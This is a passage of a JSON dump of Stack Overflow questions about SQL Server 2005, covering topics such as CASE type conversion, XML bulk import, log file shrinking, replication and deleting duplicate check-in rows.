etc.)</p>\n"},{"tags":["sql","sql-server-2005","insert","union"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":11886776,"title":"Can I INSERT a row at index n of a table?","body":"<p>I know I can do a <code>UNION</code> - but is there a better way to do this? We are using dynamic <code>SQL</code> and have it stored in tables with some the statements having an <code>ORDER BY</code> clause. I have to add a dynamic 'All' option, which is also stored in the database, to the top position to fill a drop-down in the app layer.</p>\n\n<p>I know this is a wonky solution, but I'm trapped by the application's current design. The other option is adding a bunch of code to the data model and app layer in addition to changing the stored procedure. If <code>UNION</code> is my only/best option, I can do that. I was just wondering if there was a better way <em>on the database side</em>.</p>\n\n<p>Also, I don't want a discussion on the merit of dynamic <code>SQL</code> strings stored in a database. It's the way it is and it's what I have to work with. Thanks all!</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1580,"score":2,"question_id":2142907,"title":"SQL Join on Nearest less than date","body":"<p>Normally I would just do this in the code itself, but I am curious if this can be accomplished efficiently in TSQL.</p>\n\n<pre>Table 1 \nDate - Value\n</pre>\n\n<pre>Table 2\nDate - Discount\n</pre>\n\n<p>Table 1 contains entries for each day.  Table 2 contains entries only when the discount changes.  A discount applied to a value is considered valid until a new discount is entered.</p>\n\n<p>Example data:</p>\n\n<pre>Table 1  \n1/26/2010 - 10  \n1/25/2010 - 9  \n1/24/2010 - 8  \n1/24/2010 - 9   \n1/23/2010 - 7    \n1/22/2010 - 10  \n1/21/2010 - 11\n</pre>\n\n<pre>\nTable 2\n1/26/2010 - 2  \n1/23/2010 - 1  \n1/20/2010 - 0  \n</pre>\n\n<p>What I need returned is the following: <code>T1 Date - T1 Value - T2 Discount</code></p>\n\n<p>Example data:</p>\n\n<pre>\n1/26/2010 - 10 - 2    \n1/25/2010 - 9  - 1  \n1/24/2010 - 8  - 1  \n1/24/2010 - 9  - 1  \n1/23/2010 - 7  - 1    \n1/22/2010 - 10 - 0  \n1/21/2010 - 11 - 0  \n</pre>\n\n<p>Possible or am I better off just continuing to do this in the code?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":11884920,"title":"SELECT CASE WHEN TINYINT field condition met return string","body":"<p>I am using SQL Server 2005. I am trying to do a select from a TINYINT field. If the field's value is 0 I want to select an empty string instead ' ' . The fields name is level. HEre is what I am doing:</p>\n\n<pre><code>SELECT \n[Level] = \nCase \nt.[Level]\n    WHEN 0 THEN ' '\n    ELSE t.[Level]\nEND\nFROM table t \n</code></pre>\n\n<p>This code always returns 0. I was  trying to troubleshoot the issue and tried this: </p>\n\n<pre><code>SELECT \n[Level] = \nCase \nt.[Level]\n    WHEN 0 THEN 'test'\n    ELSE t.[Level]\nEND\nFROM table t \n</code></pre>\n\n<p>And I got a the error <code>Conversion failed when converting the varchar value 'test' to data type tinyint</code></p>\n\n<p>So I'm seeing that there is a conversion problem here. I've tried:</p>\n\n<pre><code>SELECT \n[Level] = \nCase \nt.[Level]\n    WHEN 0 THEN CONVERT(VARCHAR,t.[level])\n    ELSE t.[Level]\nEND\nFROM table t \n</code></pre>\n\n<p>But this of course still returns 0, just the character, so it's still not doing what I need. I am thinking that there is most likely a better way to do this but am not sure how to approach it. Could anyone give me some advice on how to handle this? Thanks much!</p>\n"},{"tags":["xml","sql-server-2005","xml-parsing","xml-serialization"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":352,"score":2,"question_id":11880897,"title":"Best way to bulk insert XML data into SQL Server 2005 database","body":"<p>I have to shred around 25 - 30 XMLs into my SQL Server 2005 database (the total size would be around 10 MB). And I need this logic to run automatically as soon as new xml files are copied to the server.</p>\n\n<p>Ive read many posts on this site and also other sites, but can't still conclude on what must I use to shred data.</p>\n\n<p>Pls let me know which option must I should go with</p>\n\n<ol>\n<li>SqlBulk Copy</li>\n<li>C# deserialization</li>\n<li>SSIS</li>\n</ol>\n\n<p>I have to create C# classes for my data models. So C# deserialization was my first choice.\nBut pls let me know which option will be right from a performance perspective.</p>\n\n<p>Another thing I forgot to mention was the structure of the XML files will vary. It wouldnt be the same. I will have tables that will have all the columns that could possibly be populated. But the xmls will not have all the data at all times.</p>\n\n<p>Sample of the xml</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;estateList date=\"2012-08-06T12:17:05\"&gt;\n  &lt;uniqueID&gt;22XXln&lt;/uniqueID&gt;\n  &lt;category name=\"Apartment\" /&gt; \n  &lt;listingAgent&gt;\n     &lt;name&gt;DIW Office&lt;/name&gt;  \n     &lt;telephone type=\"BH\"&gt;96232 2345&lt;/telephone&gt; \n     &lt;telephone type=\"BH\"&gt;9234 2399&lt;/telephone&gt;\n     &lt;email&gt;abcd@abc.com&lt;/email&gt;    \n  &lt;/listingAgent&gt;\n  &lt;inspectionTimes /&gt; \n  &lt;description&gt;AVAILABLE NOW. &lt;/description&gt; \n  &lt;price&gt;0&lt;/price&gt;  \n  &lt;address display=\"yes\"&gt;      \n    &lt;street&gt;Lachlsan Street&lt;/street&gt;        \n    &lt;ImagesContainer&gt;        \n       &lt;img id=\"m\" modTime=\"2012-08-06-12:17:05\" url=\"http://images/2409802.jpg\" format=\"jpg\" /&gt; \n       &lt;img id=\"a\" modTime=\"2012-08-06-12:17:05\" /&gt; \n    &lt;/ImagesContainer&gt;     \n  &lt;/address&gt;\n&lt;/estateList&gt;\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":281,"score":-1,"question_id":11877809,"title":"Couldn't locate .ndf files of new file groups added","body":"<p>When I run this statement in SQL Server:</p>\n\n<pre><code>USE [master]\nGO\nALTER DATABASE &lt;DBName&gt; ADD FILEGROUP &lt;[FGName]&gt;\n</code></pre>\n\n<p>Where is the corresponding <code>.ndf</code> file created on disk?</p>\n\n<p>When I run that query, it's successful and I am able to find the new file group being added to the <code>sys.filegroups</code> table.</p>\n\n<p>But when I run </p>\n\n<pre><code>select * from sys.database_files \n</code></pre>\n\n<p>I am not able to find the files created for the new file group. I couldn't find it in the disk as well. What am I doing wrong? </p>\n\n<p>Could somebody help with this..?</p>\n"},{"tags":["sql","sql-server-2005","subquery","user-defined-functions"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":191,"score":1,"question_id":11864011,"title":"SQL Server : table-valued function does not work with sub query","body":"<p>I have a SQL Server table-valued function which is created by me I have pasted the create script below </p>\n\n<pre><code>CREATE FUNCTION [dbo].[getTableFromString]\n(       \n    @String AS nvarchar(max)\n\n)\nRETURNS @ReturnTable TABLE ( StringValues nvarchar(10)  )   \nAS begin \n\n    if (SELECT CHARINDEX(',', @String)) = 0\n        begin\n                insert into @ReturnTable (StringValues) values (subString(@String,1,len(@String)));\n        end \n    else\n        begin \n            while (SELECT CHARINDEX(',', @String)) &gt; 0\n            begin \n                insert into @ReturnTable (StringValues) values (subString(@String,1,CHARINDEX(',', @String)-1));\n                set @String  = subString(@String,CHARINDEX(',', @String)+1,len(@String));\n\n                if (SELECT CHARINDEX(',', @String)) = 0\n                begin\n                        insert into @ReturnTable (StringValues) values (subString(@String,1,len(@String)));\n                end         \n            end \n        end\n\n    return ;\nend\n</code></pre>\n\n<p>and I am using this function like below </p>\n\n<pre><code>Select sum(NetSales)\nfrom vwxsalesall\nwhere Company = 'rs'\nand storecode = (select cPrimaryStockRoomCode from CompanyMaster.CompanyProfileDetail where cCompanyNo = 'rs' and cSecondaryStockRoomCode = 'R01B')\nand trandate &gt;= '2012-01-01'\nand trandate &lt;= '2012-01-31'\nand ( \n        brand in (  \n                    select StringValues from  dbo.getTableFromString(\n                                                                    select vIncludedBrandCodes\n                                                                    from StockRoomTargetData.MonthlyTarget \n                                                                    where cCompanyNo = 'rs' \n                                                                    and cSecondaryStockRoomCode = 'R01B'\n                                                                    and nYear = 2012 \n                                                                    and nMonth = 8\n                                                                    )  \n                 ) \n    )\n</code></pre>\n\n<p>Unfortunately I am getting this  error </p>\n\n<blockquote>\n  <p>Msg 156, Level 15, State 1, Line 10<br>\n  Incorrect syntax near the keyword 'select'.<br>\n  Msg 102, Level 15, State 1, Line 16<br>\n  Incorrect syntax near ')'.</p>\n</blockquote>\n\n<p>please help me </p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":123,"score":1,"question_id":11876750,"title":"OPENXML, Convert Base64 to Binary","body":"<p>For an import/export process, we put binary data into XML as Base64 encoded strings.  The issue came up when getting the values back out...</p>\n\n<p>We're using OPENXML because performance on 2005/2008 is horrid using <a href=\"http://msdn.microsoft.com/en-us/library/ms188282.aspx\" rel=\"nofollow\">nodes()</a> - it doesn't scale well at all.  They fixed the performance issue in SQL Server 2012, but for the sake of legacy support (2005+) it's not a realistic option, and MS doesn't appear to want to backport things (assuming even possible).</p>\n\n<p>Here's some <a href=\"http://blogs.msdn.com/b/sqltips/archive/2008/06/30/converting-from-base64-to-varbinary-and-vice-versa.aspx\" rel=\"nofollow\">relevant info on the subject</a>.</p>\n\n<p>Ideally, I'm looking for a single SQL statement using OPENXML to shred an XML document that contains binary data encoded to Base64, and provide a result set there that data is correctly rendered as binary data.  I have one solution that doesn't use nodes, hoping someone has something better.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":2153,"score":3,"question_id":5789836,"title":"How to reduce ldf file size if we have applied replication on database","body":"<p>I have a Database that is using replication. Now I want to reduce the LDF file size (currently the size of the LDF is 6 GB).</p>\n\n<p>I did \"shrink\" the LDF files, but it shrank only a few MBs. We need to look for other options for it because these database are using replication. Is any solution available for it?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":187,"score":2,"question_id":11850334,"title":"sql server coalesce get first not null date","body":"<p>I am using SQL Server 2008.\nI was wondering if this is the best code to get the first not null date:</p>\n\n<pre><code>    select actualdate = coalesce((select date1 from table1), (select date2 from table2))\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":5,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":17005,"score":6,"question_id":1152932,"title":"Column name or number of supplied values does not match table definition","body":"<p>In SQL server, I am trying to insert values from one table to another by using the below query :</p>\n\n<pre><code>delete from tblTable1\n\ninsert into tblTable1 select * from tblTable1_Link\n</code></pre>\n\n<p>I am getting the following error :</p>\n\n<pre><code>Column name or number of supplied values does not match table definition.\n</code></pre>\n\n<p>I am sure that both table having same structure,column names and same data type:</p>\n\n<p>Please help!</p>\n"},{"tags":["sql","sql-server-2005","sql-server-2008","ftp","transactional-replication"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":563,"score":0,"question_id":7664671,"title":"Can SQL Transactional Replication work between SQL 2005 Standard (Publisher) and SQL 2008 R2 Web (Subscriber)?","body":"<p>I've been trying, googling and hitting my head against the wall but can't figure our what the problem is or how to solve it.</p>\n\n<p>I have and SQL 2005 Standard server acting as a publisher. I need to do transactional replication to an SQL 2008 R2 Web server on another location. </p>\n\n<p>I've set up the publication, and enabled FTP access to get the snapshot.</p>\n\n<p>On the 2005 server when I launch replication monitor it keeps saying Uninitialized Subscription.</p>\n\n<p>If I test this with a different subscriber that is running SQL 2008 Enterprise, it works fine.</p>\n\n<p>Could it be because of the version? Could it be the SQL 2008 R2 Web can't work as a subscriber with SQL 2005?</p>\n\n<p>Thanks,\nFederico</p>\n"},{"tags":["sql-server-2005","stored-procedures","autocomplete"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":15,"score":1,"question_id":11871036,"title":"'%%' Throwing off results","body":"<p>I have written a stored procedure in sql server 2005 that searches for results.  </p>\n\n<p>SP</p>\n\n<pre><code>SELECT RTRIM(DEPT_DESC) DEPT_DESC, RTRIM(DEPT_ID) DEPT_ID\nFROM T_ROLLUP_DEPT\nWHERE DEPT_ID like @SearchText + '%' OR DEPT_DESC like '%%' \n</code></pre>\n\n<p>I added the '%%' to help it search within columns.</p>\n\n<p>ie If we are searching for Medical Controller, it would allow us to type 'CONTRO' and it would yield the results Medical Controller.  </p>\n\n<p>However, this has also caused some headaches.  It seems that if I am searching by dept_id and type in '2' it brings up ALL the results. Not only the department IDs that start with 2.  Also if I type in a bunch of random numbers it also comes back with ALL the results.</p>\n\n<p>Anyone know why and how this could be fixed?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":113,"score":1,"question_id":11869550,"title":"Delete all but top record in SQL server","body":"<p>I'm trying to write a script to delete all records except for the top one (if it's just any one that's fine too, there just have to be one record left). Here's the format I have as of now:</p>\n\n<pre><code>DELETE FROM table\nWHERE id NOT IN (\n  SELECT id\n  FROM (\n    SELECT id\n    FROM table\n    ORDER BY id DESC\n    LIMIT 1 ))\n</code></pre>\n\n<p>But I realize that LIMIT is not a recognized function in SQL server 2005, so I'm kind of stuck as to what to do. Anyone have any expert knowledge on this topic? And these records are NOT duplicated, I just want to take out all but one record.</p>\n\n<p>UPDATE:</p>\n\n<p>I realized that what I'm trying to accomplish here isn't completely clear. What I need to do is to delete all but the top record in this table given that it has the same value in another column (let's call it 'anotherid').</p>\n\n<p>so its like from this:</p>\n\n<pre><code>id        value       anotherid       \n1          3           1\n2          4           1\n3          5           2\n4          6           2\n5          7           2\n</code></pre>\n\n<p>To this:</p>\n\n<pre><code>id        value       anotherid       \n1          3           1\n3          5           2\n</code></pre>\n"},{"tags":["asp.net","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":11869638,"title":"Adding Dividers","body":"<p>I currently have a Storedproc t hat is returning values for me to bind with a gridview in asp.net.  One thing I want to do is combine two fields into one seperated by a / but I cannot seem to get this working.</p>\n\n<p>Here is my stored proc</p>\n\n<pre><code>DECLARE @SQL VARCHAR(MAX);\n\nBEGIN\nSET @SQL = N'SELECT SYSTEM AS ''System''\n            , ENTN AS ''Entity''\n            , MED_CTR AS ''Medical Center''\n            , MED_CTR_LEVEL AS ''Medical Center Level''\n            , DEPT_ID AS ''Department ID''\n    FROM V_ROLLUP_SYSTEM_DESC_REV1\n    WHERE (DEPT_ID = '+CONVERT(VARCHAR,@DEPTCODE)+')\n        AND SYSTEM IN ('+@SYS+')'\nPRINT(@SQL)\nEXEC(@SQL)\n</code></pre>\n\n<p>So I want to combine MED_CTR with MED_CTR_LEVEL seperated by a \"/\" and labeled as Medical Center/ Level.  I cant seem to combine it thus far since every method I have tried to add a \"/\" in it has returned me nothing.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":11869761,"title":"Is there a way to change a column's type when returning a dataset from a procedure?","body":"<p>I'm basically looking to do something like this:</p>\n\n<pre><code>SELECT MYCOLUMN AS 'MYALIAS' VARCHAR(500) \nFROM MYTABLE\n</code></pre>\n\n<p>What I'm doing is this:</p>\n\n<pre><code>SELECT COLUMN1 AS 'TEXT',\nCOLUMN 2 AS 'VALUE'\nFROM MYTABLE\n</code></pre>\n\n<p><code>COLUMN2</code> is an <code>INT</code> column, however I need to append a string value with UNION as an \"Other\" selection. Is there a way to return that column as <code>VARCHAR</code> instead without actually building the table beforehand and using <code>INSERT INTO</code> with a <code>CONVERT()</code>? If not, no big deal, I was just looking to see if there was a slick way of doing it.</p>\n"}]}
{"total":14387,"page":12,"pagesize":100,"questions":[{"tags":["database","sql-server-2005","database-restore"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":317,"score":2,"question_id":10451261,"title":"Restore SQL Server 2005 database without overwriting DB users","body":"<p>I have a database that I constantly need to restore.</p>\n\n<p>Every time I do so, all the users that have access to DB are deleted and I have to manually add them again.</p>\n\n<p>Is there any way that I can restore the DB but the users remain intact or any script that I run before/after the restore so that I don't have to manually add all the users again?</p>\n"},{"tags":["asp.net","sql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":11857923,"title":"Deletion of Invalid Records in SQL on the basis of a Timeout","body":"<p>I have a table which stores the check-in times of employees through Time Machine on the basis of a username. If an employee punches multiple times then there would be multiple records of his check-ins. All those records which come within 1 minute of first record are invalid and must be deleted. If a record which comes more than a minute later of first record is valid and must not be deleted. Then this second valid record may also contains subsequent records which are invalid as they come within 1 min of this second valid record.Such records should also be deleted and so on. How can i do it on all the checkin records of an employee for the current date? The flag field is not in db its just a demonstration that which record is valid and which is invalid.</p>\n\n<pre><code>The Data in the db is as follows.\n\nUsername               Checktime                       CheckType          Flag\n HRA001            7/29/2012 8:16:44 AM                Check-In           Valid \n HRA001            7/29/2012 8:16:46 AM                Check-In           Invalid\n HRA001            7/29/2012 8:16:50 AM                Check-In           Invalid\n HRA001            7/29/2012 8:17:30 AM                Check-In           Invalid \n HRA001            7/29/2012 8:17:50 AM                Check-In           Valid \n HRA001            7/29/2012 8:17:53 AM                Check-In           Invalid\n HRA001            7/29/2012 8:18:40 AM                Check-In           Invalid\n HRA001            7/29/2012 8:18:54 AM                Check-In           Valid \n HRA001            7/29/2012 8:18:56 AM                Check-In           Invalid\n HRA001            7/29/2012 8:18:58 AM                Check-In           Invalid\n HRA001            7/29/2012 8:19:55 AM                Check-In           Valid\n HRA001            7/29/2012 8:20:58 AM                Check-In           Valid\n</code></pre>\n"},{"tags":["sql-server-2005","copy","sql-server-2008-r2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":11860693,"title":"copying sql server to another location","body":"<p>I need to copy my db including data from sql server 2008 R2 to another sql server (sql express 2005). I noticed that backup cannot be done from later version to earlier version. What is the best approach I should take?</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":5,"view_count":71,"score":-4,"question_id":11858902,"title":"How to recognize empty result from SQL","body":"<p>When my select command does not have any result, it throws an exception. Instead I want to continue with the process without exception. How to control this by checking whether there is data retrieved from the select statement?</p>\n\n<p>Here is my query:</p>\n\n<pre><code>sqlid = new SqlCommand(\"SELECT TOP 1 Proj_id FROM Proj_details WHERE Front_end = '\" + strfrontend + \"'ORDER BY Date_time desc\", con);\nid = sqlid.ExecuteScalar().ToString();\n</code></pre>\n"},{"tags":["asp.net","sql","sql-server-2005"],"answer_count":8,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":115,"score":0,"question_id":11839893,"title":"Deleting Invalid Duplicate Rows in SQL","body":"<p>I have a table which stores the check-in times of employees through Time Machine on the basis of a username. If an employee punches multiple times then there would be multiple records of his check-ins which would only have a time difference of few seconds in between. Obviously only the first record is valid. All the other entries are invalid and must be deleted from the Table. How can i do it if i can select all the checkin records of an employee for the current date? </p>\n\n<p>The Data in the db is as follows.</p>\n\n<pre><code>Username               Checktime                       CheckType\n HRA001            7/29/2012 8:16:44 AM                Check-In\n HRA001            7/29/2012 8:16:46 AM                Check-In\n HRA001            7/29/2012 8:16:50 AM                Check-In \n HRA001            7/29/2012 8:16:53 AM                Check-In \n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":282,"score":1,"question_id":3140259,"title":"Log file size is huge","body":"<p>We have one database and we do lot many transactios per day, so the log file size growing too much, and i have tried shrinking it but its not reducing..</p>\n\n<p>What shall i do to reduce the log file size. (We do too many inserts) </p>\n\n<p>Thanks\nSrinivas</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":11852951,"title":"SQL - Determine count of records active at time","body":"<p>I have a table that contains the following information:</p>\n\n<pre><code>Conf_Start_Time\nPart_Start_Time\nPart_End_Time\n</code></pre>\n\n<p>A record is considered to be active at time t if t falls between <code>Part_Start_Time</code> and <code>Part_End_Time</code>.</p>\n\n<p>What I'd like to do is analyze all the records to determine how many records are active given a specified day.  My proposed solution is to loop through each minute in the day (say from 6AM to 9PM) and check each record on that day to determine if the user was active at the specified time, t.</p>\n\n<p>Is there a solution to this in SQL, or should I proceed with the code solution?</p>\n\n<p>In code I would pull all the records to memory, loop through time (6AM to 9PM) and test each record on the specified day to determine if it was active at the current time.  If it's active, I would increment a counter, if not, proceed to the next record.  Next time around, reinitialize the counter and proceed looping through the day.</p>\n\n<p>We're using SQL Server 2005.</p>\n\n<p>UPDATE: The output I'm looking for would be an array of maximum concurrent usage from 6AM to 9PM</p>\n\n<pre><code>Record  Conf_Start_Time    Part_Start_Time     Part_End_Time\n1.      6/5/2012 13:40:00  6/5/2012 13:41:23   6/5/2012 13:45:27\n2.      6/5/2012 13:40:00  6/5/2012 13:40:23   6/5/2012 13:47:29\n3.      6/5/2012 13:40:00  6/5/2012 13:42:55   6/5/2012 13:44:17\n</code></pre>\n\n<p>So at time 13:40:00 0 records are active;   at time 13:41:00 1 record is active;   at time 13:42:00 2 records are active;   at time 13:43:00 3 records are active;</p>\n\n<p>And I need the data for each minute in the day.  And then each day in the month.  Can this type of looping even be done in SQL?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":291,"score":1,"question_id":11851405,"title":"Violation of UNIQUE KEY constraint 'UK_XXX'. Cannot insert duplicate key in object 'dbo.YYY'","body":"<p>I'm trying to update a field in SQL Server 2005 from one table to another field in another table, and I'm getting this whole violation of UNIQUE KEY constraint and I can't seem to figure out where it went wrong with my script. Here's what I have so far:</p>\n\n<pre><code>UPDATE table1\nSET column1 = (SELECT table2.column2\nFROM         table2 INNER JOIN\n                  table1 ON table1.id = table2.id)\n</code></pre>\n\n<p>I'm quite new to SQL and would definitely love some input in regard to this situation. Thank you so much!</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":164,"score":4,"question_id":11850170,"title":"sql server combine values in two tables","body":"<p>I am new to SQL in general and even newer to MS SQL. I apologize if the title isn't clear on what I want. </p>\n\n<p>I have two tables an old one that I want to derive data from into a new table. The tables have the exact same columns but different number of rows. The new table has multiple copies of each value in the old table, which only has 2 occurences. see below comparison of two columns: letter and amount.</p>\n\n<p>New table:           </p>\n\n<pre><code>A  0 \nA  0\nA  0\nB  0\nB  0\n</code></pre>\n\n<p>old table:</p>\n\n<pre><code>A  12\nA  0\nB  10\nB  0\nC  23\n</code></pre>\n\n<p>What I want to achieve is adding the values of the amount column from the old table into just the first occurence of the leter in the new table like so:        </p>\n\n<pre><code>A  12 \nA  0\nA  0\nB  10\nB  0\n</code></pre>\n\n<p>Inner join causes all the values to be filled ( so all the A's are set to 12).  </p>\n"},{"tags":["sql","sql-server","sql-server-2005","oracle"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":19739,"score":-2,"question_id":1559241,"title":"DECODE( ) function in SQL Server","body":"<pre><code>SELECT \n  PC_COMP_CODE,\n  'R',\n  PC_RESUB_REF,\n  DECODE(PC_SL_LDGR_CODE,'02','DR','CR'),\n  PC_DEPT_NO DEPT,\n  '',--PC_DEPT_NO,\n  PC_SL_LDGR_CODE+'/'+PC_SL_ACNO,\n  SUM( DECODE(PC_SL_LDGR_CODE,'02',1,-1) *PC_AMOUNT),\n  PC_CHEQUE_NO CHQNO\nFROM GLAS_PDC_CHEQUES\nWHERE PC_RESUB_REF IS NOT NULL AND PC_DISCD NOT IN ('d','D','T') \nGROUP BY PC_RESUB_REF, PC_COMP_CODE, 'JJ', PC_SL_LDGR_CODE+'/'+PC_SL_ACNO, PC_DEPT_NO, PC_CHEQUE_NO, DECODE(PC_SL_LDGR_CODE,'02','DR','CR')\n</code></pre>\n\n<p>Above is a Oracle query; how can I use DECODE() function in SQL Server 2005? </p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":11841137,"title":"Fail to use Not Like in sql","body":"<p>I have this Query.</p>\n\n<pre><code>SELECT\nDistinct\n   CASE CHARINDEX( '?', SessionURL)\n       WHEN 0 THEN SessionURL \n       ELSE LEFT(SessionURL, CHARINDEX( '?', SessionURL) - 1) END AS VisitPage , count(*) as [VisitTime] \nFROM VistedURL\n</code></pre>\n\n<p>Its gives following result.<pre>\n         VisitPage               VisitTime\n  a/default.aspx                    99\n  a/home.aspx                       15\n  a/admin/dashboard.aspx            05\n  a/contactus.aspx                  54\n  a/admin/login.aspx                10\n</pre><br>\nI want to use <code>Not Like</code> in above query.means:<br></p>\n\n<p><code>WHERE SessionURL NOT LIKE '%admin%'</code><br></p>\n\n<p>And remove the 3rd and 5th data of above result table which contain <code>admin</code>.But unable to use <code>Not Like</code> in above query.Thanks.</p>\n"},{"tags":["sql","sql-server-2005","sql-manager"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":90,"score":0,"question_id":11840165,"title":"Know how many table is modified on particular date in database in SQL Server 2005","body":"<p>I have a database with 40 tables in it. So I want to find tables which are modified on the particular date like</p>\n\n<ul>\n<li>How many tables were modified on <code>20 Aug 2011</code> in my database?</li>\n</ul>\n\n<p><strong>UPDATE</strong><br>\nplease note that I need the table name and not the record id</p>\n\n<p>like the names of the table whose contents are modified on  <code>20 Aug 2011</code> </p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":1156,"score":4,"question_id":3221715,"title":"Looking for SQL Optimization Interview Questions","body":"<p>I'm on a project where I was asked to take a quick peek at some reporting SQL (in a SQL Server 2K5 environment) and was surprised at what I found: 4 to 5 levels of subquerys, distinct clauses, unions, and NoLock hints (which were needed because the SQL was running so long it was blocking standard processing) - all in the same set!.</p>\n\n<p>Because I (foolishly :) mentioned that I thought the SQL was inefficient I've been labeled the \"expert\" and have been tasked with creating a test for a couple of interviewees to do that will assess their SQL optimizing abilities. I'm hoping someone can point me to some URLS, or maybe provide a list that I can use to help weed out the good from the bad. </p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":173,"score":1,"question_id":11802668,"title":"SQL Server 2008 Convert from BIGINT to UNIQUEIDENTIFIER/GUID and Back","body":"<p>I am trying to solve a problem very similar to <a href=\"http://stackoverflow.com/questions/10078209/sql-server-2008-convert-from-guid-to-bigint-and-back\">SQL Server 2008 Convert from GUID to Bigint and Back?</a> Unfortunately that example doesn't show the whole process, it only shows converting a GUID back to BIGINT.  </p>\n\n<p>I'll call this a hypothetical problem since I've already decided that storing integers as GUID's isn't very beneficial.  However at this point, I simply want to know why the conversion process isn't working.</p>\n\n<p>Everything looks good until step 5....</p>\n\n<pre><code>SELECT  1 AS Step\n        ,100966116980299\n\nSELECT  2 AS Step\n        ,CONVERT(VARBINARY(8), 100966116980299, 1)\n\nSELECT  3 AS Step\n        ,CONVERT(UNIQUEIDENTIFIER, \n            CONVERT(VARBINARY(8), 100966116980299, 1)\n        )\n\nSELECT  4 AS Step   \n        ,CONVERT(VARBINARY(8), \n            CONVERT(UNIQUEIDENTIFIER, \n                CONVERT(VARBINARY(8), 100966116980299, 1)\n            ), 1\n        )\n\nSELECT  5 AS Step   \n        ,CONVERT(BIGINT, \n            CONVERT(VARBINARY(8), \n                CONVERT(UNIQUEIDENTIFIER, \n                    CONVERT(VARBINARY(8), 100966116980299, 1)\n                ), 1\n            )\n        )\n</code></pre>\n\n<p><strong>Results</strong></p>\n\n<pre><code>Step    Value\n1       100966116980299\n2       0x0F0000014B768901\n3       0100000F-764B-0189-0000-000000000000\n4       0x0F0000014B768901\n5       1080863916129945857\n</code></pre>\n"},{"tags":["sql","sql-server-2005","stored-procedures","string-literals"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":11837199,"title":"Is it possible to return literals in a stored procedure to mimic a dataset?","body":"<p>First off, sorry about the goofy question. </p>\n\n<p>What I'm looking for is to return a \"dataset\" of hard-coded data. The reason why I need this or whether it's a good solution or not is irrelevant. I'd just like to know how I can do it. </p>\n\n<p>I basically want to  return, via a <code>SELECT</code>, this \"fake\" dataset.</p>\n\n<pre><code>DisplayText  Value\n-----------  -----\nYes          true\nNo           false\n</code></pre>\n\n<p>I'd rather avoid going through creating a table, populating it and then querying it if can. I'm thinking there's a clever way of doing this through the <code>SELECT</code>, but I haven't the skillz to do it. </p>\n\n<p>Any help would be appreciated. Yes, I know this is goofy. Let's move past that. =)</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":66,"score":3,"question_id":11836200,"title":"SQL ORDER by STRING weird syntax","body":"<p>Is there a less ugly/more programmatic way to solve this:</p>\n\n<pre><code>ORDER BY CASE \n WHEN lessonID = 'lesson_1' Then 1  \n WHEN lessonID = 'lesson_novid_1' Then 2 \n WHEN lessonID = 'lesson_2' Then 3 \n WHEN lessonID = 'lesson_novid_2' Then 4 \n WHEN lessonID = 